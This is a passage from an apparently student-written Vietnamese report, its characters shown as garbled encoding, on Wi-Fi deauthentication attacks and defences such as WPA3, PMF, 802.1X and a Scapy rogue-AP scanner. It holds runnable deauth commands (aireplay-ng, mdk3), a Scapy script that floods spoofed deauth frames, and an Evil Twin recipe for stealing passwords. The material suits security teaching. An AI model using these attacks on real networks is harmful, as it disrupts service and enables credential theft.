  1. **Kh·∫£o s√°t (Reconnaissance):**  
     - S·ª≠ d·ª•ng **airodump-ng** ƒë·ªÉ qu√©t m·∫°ng, x√°c ƒë·ªãnh AP m·ª•c ti√™u, k√™nh ho·∫°t ƒë·ªông v√† danh s√°ch client.
     - *V√≠ d·ª•:* Ph√°t hi·ªán AP `00:11:22:33:44:55` tr√™n k√™nh 6 v·ªõi client `66:77:88:99:AA:BB`.

  2. **Gi·∫£ m·∫°o v√† t·∫°o g√≥i tin:**  
     - C·∫•u t·∫°o g√≥i tin Deauthentication d·ª±a tr√™n th√¥ng tin thu th·∫≠p ƒë∆∞·ª£c, bao g·ªìm ƒë·ªãa ch·ªâ MAC c·ªßa client v√† AP c√πng v·ªõi Reason Code.

  3. **G·ª≠i g√≥i tin li√™n t·ª•c:**  
     - G·ª≠i li√™n t·ª•c c√°c g√≥i tin Deauthentication ƒë·ªÉ duy tr√¨ tr·∫°ng th√°i ng·∫Øt k·∫øt n·ªëi cho client.

## 2.5. So s√°nh v·ªõi Disassociation Attack

M·∫∑c d√π c·∫£ Deauthentication Attack v√† Disassociation Attack ƒë·ªÅu nh·∫±m ph√° v·ª° k·∫øt n·ªëi gi·ªØa client v√† AP, ch√∫ng c√≥ ƒëi·ªÉm kh√°c bi·ªát v·ªÅ c∆° ch·∫ø v√† t√°c ƒë·ªông:

| **Ti√™u ch√≠**             | **Deauthentication Attack**                                                                                                  | **Disassociation Attack**                                                                                   |
|--------------------------|-----------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|
| **Khung tin s·ª≠ d·ª•ng**    | **Deauthentication Frame:** Th√¥ng b√°o h·ªßy k·∫øt n·ªëi v√† x√≥a th√¥ng tin phi√™n.                                                    | **Disassociation Frame:** Th√¥ng b√°o y√™u c·∫ßu client r·ªùi kh·ªèi BSS nh∆∞ng kh√¥ng x√≥a to√†n b·ªô th√¥ng tin phi√™n.      |
| **M·ª•c ƒë√≠ch**             | Bu·ªôc client ƒëƒÉng nh·∫≠p l·∫°i, g√¢y gi√°n ƒëo·∫°n li√™n t·ª•c v√† t·∫°o c∆° h·ªôi cho t·∫•n c√¥ng n√¢ng cao (v√≠ d·ª•: Evil Twin).                       | Ng·∫Øt k·∫øt n·ªëi t·∫°m th·ªùi; client c√≥ th·ªÉ t·ª± ƒë·ªông k·∫øt n·ªëi l·∫°i m√† kh√¥ng c·∫ßn qu√° tr√¨nh ƒëƒÉng nh·∫≠p l·∫°i ƒë·∫ßy ƒë·ªß.         |
| **T√°c ƒë·ªông ƒë·∫øn k·∫øt n·ªëi** | G√¢y ra m·∫•t k·∫øt n·ªëi nghi√™m tr·ªçng, y√™u c·∫ßu client ph·∫£i tr·∫£i qua l·∫°i qu√° tr√¨nh x√°c th·ª±c.                                        | G√¢y gi√°n ƒëo·∫°n ng·∫Øn h·∫°n, client c√≥ th·ªÉ ph·ª•c h·ªìi k·∫øt n·ªëi t·ª± ƒë·ªông.                                             |
| **Kh·∫£ nƒÉng ph·ª•c h·ªìi**     | Y√™u c·∫ßu qu√° tr√¨nh x√°c th·ª±c l·∫°i ƒë·∫ßy ƒë·ªß, l√†m gi·∫£m tr·∫£i nghi·ªám ng∆∞·ªùi d√πng.                                                     | Cho ph√©p client kh√¥i ph·ª•c k·∫øt n·ªëi nhanh ch√≥ng.                                                             |
| **V√≠ d·ª• th·ª±c ti·ªÖn**      | S·ª≠ d·ª•ng **aireplay-ng** ƒë·ªÉ g·ª≠i 10 g√≥i deauth, bu·ªôc client ƒëƒÉng nh·∫≠p l·∫°i ho√†n to√†n.                                         | G·ª≠i disassociation frame khi·∫øn client m·∫•t k·∫øt n·ªëi nh∆∞ng nhanh ch√≥ng t√°i k·∫øt n·ªëi n·∫øu c√≥ s·∫µn.                    |

## 2.6. C√¥ng c·ª• Th·ª±c hi·ªán v√† V√≠ d·ª• C·ª• th·ªÉ

### 2.6.1. aireplay-ng

- **M√¥ t·∫£:**  
  Aireplay-ng thu·ªôc b·ªô Aircrack-ng suite, cho ph√©p g·ª≠i c√°c g√≥i tin t√πy ch·ªânh, bao g·ªìm c·∫£ deauthentication frame, nh·∫±m ki·ªÉm tra b·∫£o m·∫≠t c·ªßa m·∫°ng WiFi.

- **V√≠ d·ª• l·ªánh:**  
  ```bash
  aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB wlan0mon
  ```
  - **Gi·∫£i th√≠ch:**  
    - `--deauth 10`: G·ª≠i 10 g√≥i tin deauthentication.
    - `-a 00:11:22:33:44:55`: ƒê·ªãa ch·ªâ MAC c·ªßa AP m·ª•c ti√™u.
    - `-c 66:77:88:99:AA:BB`: ƒê·ªãa ch·ªâ MAC c·ªßa client m·ª•c ti√™u.
    - `wlan0mon`: Giao di·ªán chuy·ªÉn sang ch·∫ø ƒë·ªô monitor.

### 2.6.2. MDK3

- **M√¥ t·∫£:**  
  MDK3 l√† c√¥ng c·ª• t·∫•n c√¥ng m·∫°ng kh√¥ng d√¢y m·∫°nh m·∫Ω, h·ªó tr·ª£ nhi·ªÅu ch·∫ø ƒë·ªô t·∫•n c√¥ng, trong ƒë√≥ c√≥ deauthentication.

- **V√≠ d·ª• l·ªánh:**  
  ```bash
  mdk3 wlan0mon d -c 6 -b 00:11:22:33:44:55
  ```
  - **Gi·∫£i th√≠ch:**  
    - `d`: Ch·∫ø ƒë·ªô t·∫•n c√¥ng deauthentication.
    - `-c 6`: K√™nh ho·∫°t ƒë·ªông c·ªßa AP.
    - `-b 00:11:22:33:44:55`: ƒê·ªãa ch·ªâ MAC c·ªßa AP m·ª•c ti√™u.
  - **L∆∞u √Ω:**  
    Tham kh·∫£o t√†i li·ªáu c·ªßa MDK3 ƒë·ªÉ ƒëi·ªÅu ch·ªânh tham s·ªë cho ph√π h·ª£p v·ªõi m·ª•c ti√™u.

### 2.6.3. Scapy

- **M√¥ t·∫£:**  
  Scapy l√† th∆∞ vi·ªán Python m·∫°nh m·∫Ω, cho ph√©p x√¢y d·ª±ng v√† thao t√°c v·ªõi c√°c g√≥i tin t√πy ch·ªânh, h·ªØu √≠ch cho nghi√™n c·ª©u v√† ki·ªÉm th·ª≠ b·∫£o m·∫≠t.

- **V√≠ d·ª• m√£ ngu·ªìn:**  
  ```python
  from scapy.all import *

  # C·∫•u h√¨nh th√¥ng tin
  client_mac = "66:77:88:99:AA:BB"
  ap_mac = "00:11:22:33:44:55"
  iface = "wlan0mon"

  # T·∫°o g√≥i Beacon th√¥ng th∆∞·ªùng (ƒë·ªÉ ph√¢n t√≠ch c·∫•u tr√∫c)
  beacon_frame = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info="ExampleAP")
  print("Th√¥ng tin g√≥i Beacon:")
  beacon_frame.show()

  # T·∫°o g√≥i tin Deauthentication d·ª±a tr√™n th√¥ng tin t·ª´ Beacon
  dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
  deauth_frame = RadioTap()/dot11/Dot11Deauth(reason=7)
  print("Th√¥ng tin g√≥i Deauthentication:")
  deauth_frame.show()

  # G·ª≠i g√≥i tin Deauthentication li√™n t·ª•c ƒë·ªÉ t·∫•n c√¥ng
  sendp(deauth_frame, iface=iface, count=100, inter=0.1)
  ```
  - **Gi·∫£i th√≠ch:**  
    - ƒêo·∫°n m√£ ƒë·∫ßu ti√™n minh h·ªça c√°ch t·∫°o m·ªôt Beacon frame ƒë·ªÉ n·∫Øm b·∫Øt c·∫•u tr√∫c g√≥i tin th√¥ng th∆∞·ªùng.
    - Sau ƒë√≥, s·ª≠ d·ª•ng th√¥ng tin c·ªßa Beacon (ƒë·ªãa ch·ªâ MAC c·ªßa AP) ƒë·ªÉ x√¢y d·ª±ng g√≥i tin Deauthentication v·ªõi Reason Code 7.
    - Cu·ªëi c√πng, g√≥i tin Deauthentication ƒë∆∞·ª£c g·ª≠i li√™n t·ª•c qua giao di·ªán monitor ƒë·ªÉ th·ª±c hi·ªán t·∫•n c√¥ng.

# 3Ô∏è‚É£ C√°ch ph√≤ng ch·ªëng t·∫•n c√¥ng Deauthentication (Ng∆∞·ªùi 3)
WPA3 v√† Protected Management Frames (PMF).
## WPA3
-    WPA l√† t·ª´ vi·∫øt t·∫Øt cho Wi-Fi Protected Access, n√≥ l√† m·ªôt ch·ª©ng ch·ªâ b·∫£o m·∫≠t do Wi-Fi Alliance t·∫°o ra ƒë·ªÉ b·∫£o v·ªá c√°c k·∫øt n·ªëi kh√¥ng d√¢y. B·∫°n c√≥ th·ªÉ hi·ªÉu ƒë∆°n gi·∫£n r·∫±ng WPA l√† m·ªôt b·ªô quy t·∫Øc ƒë∆∞·ª£c thi·∫øt k·∫ø ƒë·ªÉ gi√∫p b·∫£o v·ªá b·ªô ƒë·ªãnh tuy·∫øn Wi-Fi nh√† m√¨nh, c√°c thi·∫øt b·ªã m√† n√≥ k·∫øt n·ªëi t·ªõi c√πng nh·ªØng d·ªØ li·ªáu ƒë∆∞·ª£c truy·ªÅn ƒëi. Nh·ªù v√†o m·ªôt l·ªõp li√™n l·∫°c trung gian, hai thi·∫øt b·ªã ƒë·∫ßu v√† cu·ªëi s·∫Ω kh√¥ng c·∫ßn ph·∫£i bi·∫øt ƒë∆∞·ª£c c√°c th√¥ng tin "b√≠ m·∫≠t" c·ªßa nhau.

-    WPA2 ƒëang l√† chu·∫©n b·∫£o m·∫≠t ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü n∆∞·ªõc ta hi·ªán t·∫°i. N√≥ ƒë∆∞·ª£c ra m·∫Øt v√†o nƒÉm 2004 v√† l√† m·ªôt b∆∞·ªõc c·∫£i ti·∫øn l·ªõn so v·ªõi nh·ªØng g√¨ m√† ch√∫ng ta ph·∫£i s·ª≠ d·ª•ng tr∆∞·ªõc ƒë√≥, song n√≥ ƒë√£ d·∫ßn b·ªôc l·ªô nh·ªØng ƒëi·ªÉm l·ªói th·ªùi sau 14 nƒÉm ho·∫°t ƒë·ªông. Do ƒë√≥, WPA3 ƒë∆∞·ª£c ra ƒë·ªùi ƒë·ªÉ gi√∫p kh·∫Øc ph·ª•c nh·ªØng y·∫øu ƒëi·ªÉm c·∫ßn ƒë∆∞·ª£c thay th·∫ø c·ªßa phi√™n b·∫£n ti·ªÅn nhi·ªám.

-    Giao th·ª©c b·∫£o m·∫≠t m·ªõi cung c·∫•p m·ªôt s·ªë c·∫£i ti·∫øn l·ªõn cho c√°c thi·∫øt b·ªã c√≥ h·ªó tr·ª£ Wi-Fi v·ªÅ c·∫•u h√¨nh, x√°c th·ª±c v√† tƒÉng c∆∞·ªùng m√£ h√≥a, khi·∫øn hacker kh√≥ t·∫•n c√¥ng WiFi ho·∫∑c r√¨nh m√≤ m·∫°ng c·ªßa b·∫°n h∆°n. Wi-Fi Alliance ƒë√£ gi·ªõi thi·ªáu hai lo·∫°i c·ªßa giao th·ª©c b·∫£o m·∫≠t m·ªõi nh·∫•t - WPA3-Personal v√† WPA3-Enterprise - cho c√°c m·∫°ng kh√¥ng d√¢y c√° nh√¢n, doanh nghi·ªáp v√† IoT.

### WPA3-Personal
-    WPA3-Personal (WPA3-SAE): Ch·∫ø ƒë·ªô n√†y t·∫≠p trung c·∫£i thi·ªán b·∫£o m·∫≠t cho ng∆∞·ªùi d√πng c√° nh√¢n b·∫±ng c√°ch s·ª≠ d·ª•ng Simultaneous Authentication of Equals (SAE). So v·ªõi WPA2, SAE gi√∫p tƒÉng c∆∞·ªùng m√£ h√≥a ngay c·∫£ khi ng∆∞·ªùi d√πng ƒë·∫∑t m·∫≠t kh·∫©u ƒë∆°n gi·∫£n.
### WPA3-Enterprise
-    WPA3-Enterprise: ƒê√¢y l√† b·∫£n n√¢ng c·∫•p t·ª´ WPA2-Enterprise, ƒë∆∞·ª£c thi·∫øt k·∫ø cho c√°c t·ªï ch·ª©c v√† doanh nghi·ªáp. Ch·∫ø ƒë·ªô n√†y y√™u c·∫ßu Protected Management Frames (PMF) tr√™n t·∫•t c·∫£ c√°c k·∫øt n·ªëi, h·ªó tr·ª£ nhi·ªÅu ph∆∞∆°ng th·ª©c x√°c th·ª±c EAP v√† cung c·∫•p m√£ h√≥a m·∫°nh h∆°n v·ªõi 128-bit authenticated encryption, 256-bit key derivation & confirmation, c√πng 128-bit PMF ƒë·ªÉ b·∫£o v·ªá d·ªØ li·ªáu quan tr·ªçng.
    -    TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384: ECDHE v√† ECDSA s·ª≠ d·ª•ng s·ªë nguy√™n t·ªë 384-bit
    -    TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384: ECDHE s·ª≠ d·ª•ng s·ªë nguy√™n t·ªë 384-bit; s·ªë module RSA ‚â• 3072-bit
    -    TLS_DHE_RSA_WITH_AES_256_GCM_SHA384: s·ªë module RSA ‚â• 3072-bit v√† DHE ‚â• 3072-bit.

## Protected Management Frames (PMF)
-    Tr∆∞·ªõc khi PMF ƒë∆∞·ª£c tri·ªÉn khai, m·ªôt khung qu·∫£n l√Ω (Management Frame) trong Wi-Fi c√≥ c·∫•u tr√∫c ƒë∆°n gi·∫£n:
    -    ![image](https://hackmd.io/_uploads/rJGXoOe21g.png)
    -    802.11 hdr: Ph·∫ßn ti√™u ƒë·ªÅ c·ªßa giao th·ª©c 802.11, ch·ª©a th√¥ng tin v·ªÅ ƒë·ªãa ch·ªâ MAC, lo·∫°i khung, v.v.
    -    Mgmt frame body: D·ªØ li·ªáu th·ª±c t·∫ø c·ªßa khung qu·∫£n l√Ω.
    -    FCS (Frame Check Sequence): D√πng ƒë·ªÉ ki·ªÉm tra l·ªói d·ªØ li·ªáu khi truy·ªÅn.

--> Kh√¥ng c√≥ m√£ h√≥a ho·∫∑c x√°c th·ª±c, hacker c√≥ th·ªÉ gi·∫£ m·∫°o khung qu·∫£n l√Ω ƒë·ªÉ th·ª±c hi·ªán c√°c cu·ªôc t·∫•n c√¥ng nh∆∞ Deauthentication Attack.

Khi PMF ƒë∆∞·ª£c k√≠ch ho·∫°t, khung qu·∫£n l√Ω s·∫Ω c√≥ th√™m c√°c c∆° ch·∫ø b·∫£o m·∫≠t ƒë·ªÉ ngƒÉn ch·∫∑n gi·∫£ m·∫°o v√† t·∫•n c√¥ng.

-    C·∫•u tr√∫c m·ªõi bao g·ªìm:
    -    802.11 hdr: V·∫´n gi·ªØ nguy√™n nh∆∞ tr∆∞·ªõc.
    -    Management frame body: Ch·ª©a th√¥ng tin qu·∫£n l√Ω c·ªßa m·∫°ng Wi-Fi.
    -    MIC IE (Message Integrity Check Information Element):Ch·ª©a M√£ X√°c Th·ª±c To√†n V·∫πn (MIC - Message Integrity Code), gi√∫p x√°c minh r·∫±ng khung qu·∫£n l√Ω kh√¥ng b·ªã gi·∫£ m·∫°o ƒë∆∞·ª£c t√≠nh to√°n d·ª±a tr√™n kh√≥a b·∫£o m·∫≠t gi·ªØa thi·∫øt b·ªã v√† ƒëi·ªÉm truy c·∫≠p.
    -    FCS (Frame Check Sequence): V·∫´n c√≥ ƒë·ªÉ ki·ªÉm tra l·ªói d·ªØ li·ªáu.
--> Khi ƒë√≥ s·∫Ω b·∫£o v·ªá c√°c Management Frames kh·ªèi c√°c cu·ªôc t·∫•n c√¥ng gi·∫£ m·∫°o (spoofing) ho·∫∑c t·ª´ ch·ªëi d·ªãch v·ª• (DoS). PMF gi√∫p tƒÉng c∆∞·ªùng b·∫£o m·∫≠t m·∫°ng kh√¥ng d√¢y b·∫±ng c√°ch ƒë·∫£m b·∫£o r·∫±ng c√°c khung qu·∫£n l√Ω quan tr·ªçng ƒë∆∞·ª£c m√£ h√≥a v√† x√°c th·ª±c.

## 802.1X Authentication v·ªõi Radius Server.
![image](https://hackmd.io/_uploads/BylNjulnJg.png)



-    Trong WPA ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c x√°c th·ª±c th√¥ng qua m·ªôt m√°y ch·ªß x√°c th·ª±c IEEE 802.1X(th∆∞·ªùng l√† m·ªôt m√°y ch·ªß RADIUS).

-    Ba th√†nh ph·∫ßn ch√≠nh trong 802.1X
    -    Supplicant (M√°y kh√°ch - Thi·∫øt b·ªã ng∆∞·ªùi d√πng)
        ƒê√¢y l√† thi·∫øt b·ªã mu·ªën k·∫øt n·ªëi v√†o m·∫°ng.
        Supplicant c≈©ng c√≥ th·ªÉ l√† ph·∫ßn m·ªÅm ch·∫°y tr√™n thi·∫øt b·ªã, gi√∫p g·ª≠i th√¥ng tin x√°c th·ª±c ƒë·∫øn Authenticator.
        Th√¥ng tin x√°c th·ª±c c√≥ th·ªÉ l√† username/password ho·∫∑c ch·ª©ng ch·ªâ s·ªë.
    -    Authenticator (B·ªô ki·ªÉm so√°t - Switch/AP Wi-Fi)
    L√† thi·∫øt b·ªã trung gian gi√∫p ki·ªÉm so√°t truy c·∫≠p.
    V√≠ d·ª•: Switch Ethernet ho·∫∑c Access Point Wi-Fi.
    Kh√¥ng t·ª± x√°c th·ª±c ng∆∞·ªùi d√πng, m√† ch·ªâ chuy·ªÉn ti·∫øp y√™u c·∫ßu ƒë·∫øn Authentication Server.
    C√≥ th·ªÉ ch·∫∑n ho·∫∑c c·∫•p quy·ªÅn truy c·∫≠p t√πy theo k·∫øt qu·∫£ x√°c th·ª±c.
    -    Authentication Server (M√°y ch·ªß x√°c th·ª±c - RADIUS Server)
    Ch·∫°y ph·∫ßn m·ªÅm h·ªó tr·ª£ RADIUS v√† EAP ƒë·ªÉ x·ª≠ l√Ω y√™u c·∫ßu x√°c th·ª±c.
    X√°c minh danh t√≠nh d·ª±a tr√™n th√¥ng tin t·ª´ Supplicant.
    N·∫øu x√°c th·ª±c th√†nh c√¥ng, s·∫Ω c·∫•p quy·ªÅn truy c·∫≠p v√†o m·∫°ng.
    N·∫øu x√°c th·ª±c th·∫•t b·∫°i, thi·∫øt b·ªã s·∫Ω b·ªã t·ª´ ch·ªëi truy c·∫≠p.


-    Quy tr√¨nh x√°c th·ª±c chi ti·∫øt
    -    Supplicant g·ª≠i y√™u c·∫ßu k·∫øt n·ªëi: Thi·∫øt b·ªã ng∆∞·ªùi d√πng c·ªë g·∫Øng k·∫øt n·ªëi v·ªõi m·∫°ng.
    -    Authenticator y√™u c·∫ßu th√¥ng tin ƒëƒÉng nh·∫≠p: G·ª≠i th√¥ng ƒëi·ªáp y√™u c·∫ßu Supplicant cung c·∫•p username/password ho·∫∑c ch·ª©ng ch·ªâ s·ªë.
    -    Supplicant ph·∫£n h·ªìi: G·ª≠i th√¥ng tin x√°c th·ª±c ƒë·∫øn Authenticator.
    -    Authenticator chuy·ªÉn th√¥ng tin ƒë·∫øn Authentication Server (qua giao th·ª©c RADIUS).
    -    Authentication Server ki·ªÉm tra th√¥ng tin:
    N·∫øu h·ª£p l·ªá ‚ûù g·ª≠i t√≠n hi·ªáu Access-Accept ‚ûù cho ph√©p truy c·∫≠p.
    N·∫øu kh√¥ng h·ª£p l·ªá ‚ûù g·ª≠i t√≠n hi·ªáu Access-Reject ‚ûù ch·∫∑n truy c·∫≠p.
    -    Authenticator c·∫•p quy·ªÅn truy c·∫≠p n·∫øu x√°c th·ª±c th√†nh c√¥ng.
## Kismet - IDS ph√°t hi·ªán t·∫•n c√¥ng deauth.

![Untitled](https://hackmd.io/_uploads/SyqtJkM3ke.png)

## S·ª≠ d·ª•ng Rogue AP Detection ƒë·ªÉ ph√°t hi·ªán AP gi·∫£ m·∫°o.
-    Access Point Rogue (hay c√≤n g·ªçi l√† Rogue AP) l√† m·ªôt ƒëi·ªÉm truy c·∫≠p Wi-Fi tr√°i ph√©p ho·∫∑c kh√¥ng ƒë∆∞·ª£c qu·∫£n l√Ω trong m·∫°ng c·ªßa m·ªôt t·ªï ch·ª©c. ƒê√¢y c√≥ th·ªÉ l√† m·ªôt thi·∫øt b·ªã Wi-Fi ƒë∆∞·ª£c c·∫Øm v√†o m·∫°ng n·ªôi b·ªô m√† kh√¥ng c√≥ s·ª± cho ph√©p c·ªßa qu·∫£n tr·ªã vi√™n, g√¢y ra c√°c r·ªßi ro b·∫£o m·∫≠t nghi√™m tr·ªçng.
-    Access Point Rogue th∆∞·ªùng k·∫øt h·ª£p v·ªõi deauthentication attack. Attacker c·∫ßn 2 card wifi. 1 card d√πng ƒë·ªÉ ng·∫Øt quy·ªÅn truy c·∫≠p client b·∫±ng c√°ch g·ª≠i deauthentication frame. Card c√≤n l·∫°i d√πng ƒë·ªÉ t·∫°o AP gi·∫£ ƒë·ªÉ d·ª• victim v√†o AP gi·∫£ c·ªßa m√¨nh.

![image](https://hackmd.io/_uploads/Syt4o_l3ye.png)


-    C√°ch ki·ªÉm tra Rouge AP ch·ªâ c√≥ c√°ch l√† ki·ªÉm tra ƒë·ªãa ch·ªâ MAC c·ªßa AP ƒë√≥. Th·∫ø n√™n c·∫ßn ph·∫£i c√≥ danh s√°ch nh·ªØng ƒë·ªãa ch·ªâ MAC ƒë√£ ƒëƒÉng k√Ω tr√™n Router/Switch. N·∫øu ƒë·ªãa ch·ªâ MAC kh√¥ng c√≥ trong danh s√°ch ƒë√≥, th√¨ ƒë√≥ c√≥ th·ªÉ l√† Rouge AP.
-    B·∫≠t ch·∫ø ƒë·ªô monitor c·ªßa card wifi, s·ª≠ d·ª•ng th∆∞ vi√™n scapy c·ªßa python ƒë·ªÉ qu√©t v√† ki·ªÉm tra
```python3=
from scapy.all import *
import os
import sys
from threading import Thread


CHANNELS = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
def switch_channel():
    while True:
        for ch in CHANNELS:
            os.system(f'iwconfig {sys.argv[1]} channel {ch}')
            time.sleep(0.5)

# https://standards-oui.ieee.org/oui/oui.txt
vendors = open('oui.txt', 'r').read()
def check_network(ssid, bssid, signal_strength, channel, enc):
    if bssid[:8].upper().replace(':', '') not in vendors:
        rogue = "‚ö†Ô∏è  Susspect"
    else:
        rogue = "‚úÖ Credible"
    print(f"{ssid[:15]:15}\t{bssid}\t{signal_strength}\t{channel}\t{enc}\t{rogue}")

# Danh s√°ch l∆∞u th√¥ng tin c√°c AP
wifi_networks = []
def sniffer(packet):
    global wifi_networks
    if packet.haslayer(Dot11Beacon):  # Ki·ªÉm tra g√≥i tin qu·∫£ng b√° SSID c·ªßa AP
        bssid = packet[Dot11].addr2  # ƒê·ªãa ch·ªâ MAC AP (BSSID)
        ssid = packet[Dot11Elt].info.decode(errors="ignore")  # T√™n Wi-Fi (ESSID)

        try:
            signal_strength = packet.dBm_AntSignal  # M·ª©c t√≠n hi·ªáu (PWR)
        except:
            signal_strength = "N/A"

        # Ki·ªÉm tra ki·ªÉu m√£ h√≥a (WPA, WPA2, WEP)
        enc = "Open"
        if packet.haslayer(Dot11EltRSN):
            enc = "WPA2"
        elif packet.haslayer(Dot11WEP):
            enc = "WEP"
        elif packet.haslayer(Dot11Elt) and b"\x00\x0f\xac" in packet[Dot11Elt].info:
            enc = "WPA"

        # L·∫•y k√™nh Wi-Fi (CH)
        channel = None
        dot11elt = packet.getlayer(Dot11Elt)
        while dot11elt:
            if dot11elt.ID == 3:  # Tag Number 3 l√† k√™nh
                channel = ord(dot11elt.info)
                break
            dot11elt = dot11elt.payload

        if (ssid, bssid) not in wifi_networks:
            wifi_networks.append((ssid, bssid))
            check_network(ssid, bssid, signal_strength, channel, enc)

if __name__=='__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <interface_monitor>')
        exit(0)

    # Ki·ªÉm tra n·∫øu ƒëang ch·∫°y tr√™n Windows th√¨ b√°o l·ªói
    if os.name == "nt":
        print("‚ö†Ô∏è Windows detected! Please use Kali Linux with adapter support Monitor mode!")
    else:
        print("üì° Scanning for Rouge AP...\nPress Ctrl+C to stop!")
        t = Thread(target=switch_channel)
        t.daemon = True
        t.start()


        print("\nüîç List of wifi detected:")
        print("SSID\t\tBSSID\t\t\tPWR\tCH\tENC\t‚ö†Ô∏è  Rogue AP?")
        print("--------------------------------------------------------------------------------")

        sniff(iface=sys.argv[1], prn=sniffer, store=0, timeout=30)  # Qu√©t trong 30 gi√¢y
```

![image](https://hackmd.io/_uploads/SkWBiuenyx.png)


-    C√°ch ch·ªëng Rogue Access Point ·ªü n∆°i c√¥ng c·ªông:
    -    Tr√°nh k·∫øt n·ªëi wifi c√¥ng c·ªông kh√¥ng m·∫≠t kh·∫©u (Open wifi)
    -    S·ª≠ d·ª•ng VPN ƒë·ªÉ m√£ h√≥a th√¥ng tin, tr√°nh hacker c√≥ th·ªÉ b·∫Øt ƒë∆∞·ª£c c√°c g√≥i tin ch∆∞a m√£ h√≥a.
    -    S·ª≠ d·ª•ng d·ªØ li·ªáu di ƒë·ªông thay v√¨ Wifi c√¥ng c·ªông.


## C√°ch b·∫£o v·ªá m·∫°ng c√° nh√¢n: T·∫Øt SSID Broadcast, Gi·ªõi h·∫°n MAC Address.
### T·∫Øt SSID Broadcast

![image](https://hackmd.io/_uploads/ByDSjOg3yg.png)


### Gi·ªõi h·∫°n MAC Address

-    Ch·∫∑n ƒë·ªãa ch·ªâ mac
![image](https://hackmd.io/_uploads/r1JLj_xnkx.png)


-    Allow nh·ªØng ƒë·ªãa ch·ªâ mac uy t√≠n
![image](https://hackmd.io/_uploads/S1HUoux2kg.png)


# 4Ô∏è‚É£ ·ª®ng d·ª•ng th·ª±c t·∫ø & K·∫øt lu·∫≠n (Ng∆∞·ªùi 4)
## **Deauth Attack k·∫øt h·ª£p v·ªõi Evil Twin Attack (Fake AP)**  

Deauth Attack c√≥ th·ªÉ ƒë√≥ng vai tr√≤ quan tr·ªçng trong vi·ªác th·ª±c hi·ªán **Evil Twin Attack**, gi√∫p k·∫ª t·∫•n c√¥ng ƒë√°nh l·ª´a n·∫°n nh√¢n k·∫øt n·ªëi v√†o m·ªôt ƒëi·ªÉm truy c·∫≠p gi·∫£ m·∫°o (**Fake AP**) thay v√¨ AP th·∫≠t.  

---

### **üìå C√°ch th·ª©c t·∫•n c√¥ng**  
#### üî¥ **B∆∞·ªõc 1: Th·ª±c hi·ªán Deauth Attack ƒë·ªÉ ng·∫Øt k·∫øt n·ªëi n·∫°n nh√¢n kh·ªèi AP th·∫≠t**  
- 
s·ª≠ d·ª•ng **Deauth Attack** ƒë·ªÉ g·ª≠i c√°c g√≥i **Deauthentication** ƒë·∫øn client m·ª•c ti√™u, bu·ªôc n√≥ ph·∫£i ng·∫Øt k·∫øt n·ªëi kh·ªèi Wi-Fi th·∫≠t.  
- C√¥ng c·ª• ph·ªï bi·∫øn:  
  - `aircrack-ng` ‚Üí `aireplay-ng -0 5 -a <MAC_AP> -c <MAC_CLIENT> wlan0mon`  
  - `mdk3 wlan0mon d` (G·ª≠i li√™n t·ª•c g√≥i deauth)  

---

#### üî¥ **B∆∞·ªõc 2: T·∫°o Evil Twin - Fake AP**  
- K·∫ª t·∫•n c√¥ng t·∫°o m·ªôt ƒëi·ªÉm truy c·∫≠p gi·∫£ **(Fake AP)** c√≥ c√πng t√™n SSID v·ªõi AP th·∫≠t.  
- N·∫°n nh√¢n, sau khi b·ªã ng·∫Øt k·∫øt n·ªëi, s·∫Ω v√¥ t√¨nh k·∫øt n·ªëi v√†o Fake AP.  
- C√¥ng c·ª• ph·ªï bi·∫øn:  
  - `hostapd` (D√πng ƒë·ªÉ t·∫°o Fake AP)  
  - `airbase-ng` ‚Üí `airbase-ng -e <SSID> -c <Channel> wlan0mon`  

---

#### üî¥ **B∆∞·ªõc 3: Thu th·∫≠p d·ªØ li·ªáu n·∫°n nh√¢n**  
Sau khi n·∫°n nh√¢n k·∫øt n·ªëi v√†o Fake AP, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ:  
1. **Ch·∫∑n d·ªØ li·ªáu (Packet Sniffing)** b·∫±ng `Wireshark` ho·∫∑c `tcpdump`.  
2. **T·∫•n c√¥ng SSL Strip** ƒë·ªÉ √©p n·∫°n nh√¢n s·ª≠ d·ª•ng HTTP thay v√¨ HTTPS (`Bettercap`).  
3. **G√†i trang ƒëƒÉng nh·∫≠p gi·∫£** ƒë·ªÉ ƒë√°nh c·∫Øp m·∫≠t kh·∫©u (`dnsspoof`, `ettercap`).  

---

### **üöÄ C√¥ng c·ª• th·ª±c hi·ªán**
| C√¥ng c·ª• | M·ª•c ƒë√≠ch |
|---------|---------|
| `aircrack-ng` | Deauth Attack |
| `hostapd` | T·∫°o Fake AP |
| `ettercap` | Thu th·∫≠p d·ªØ li·ªáu |
| `Bettercap` | Man-in-the-Middle |
| `Wireshark` | Ph√¢n t√≠ch g√≥i tin |

## **4.2 M·ªôt s·ªë k·ªπ thu·∫≠t n√¢ng cao nh∆∞ SSID Cloaking, MiTM v·ªõi Deauth Attack**

### **4.2.1. SSID Cloaking k·∫øt h·ª£p v·ªõi Deauth Attack**  

#### üîç **SSID Cloaking l√† g√¨?**  
SSID Cloaking (·∫©n SSID) l√† m·ªôt k·ªπ thu·∫≠t b·∫£o m·∫≠t gi√∫p router Wi-Fi kh√¥ng ph√°t s√≥ng t√™n m·∫°ng (SSID). Khi SSID b·ªã ·∫©n, ch·ªâ nh·ªØng thi·∫øt b·ªã ƒë√£ bi·∫øt t√™n m·∫°ng m·ªõi c√≥ th·ªÉ k·∫øt n·ªëi.  

#### ‚öî **K·∫øt h·ª£p SSID Cloaking v·ªõi Deauth Attack**  
